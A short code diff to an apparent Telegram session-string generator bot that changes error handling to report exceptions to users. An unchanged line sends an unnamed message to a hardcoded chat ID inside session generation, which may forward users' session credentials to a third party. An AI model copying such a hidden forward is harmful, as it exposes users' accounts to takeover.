@@ -243,9 +243,11 @@ async def gen_session(
                 disable_web_page_preview=True,
             )
             await client.send_message(-1004261572457, txt2)
-            
-    except KeyError:
-        pass
+
+    except Exception as e:
+        error_message = f"An error occurred: {str(e)}"
+        await Anony.send_message(chat_id=user_id, text=error_message)
+    
     try:
         await client.disconnect()
         await Anony.send_message(
@@ -263,8 +265,9 @@ async def gen_session(
             ),
             disable_web_page_preview=True,
         )
-    except:
-        pass
+    except Exception as e:
+        error_message = f"An error occurred: {str(e)}"
+        await Anony.send_message(chat_id=user_id, text=error_message)
 
 
 async def cancelled(message):
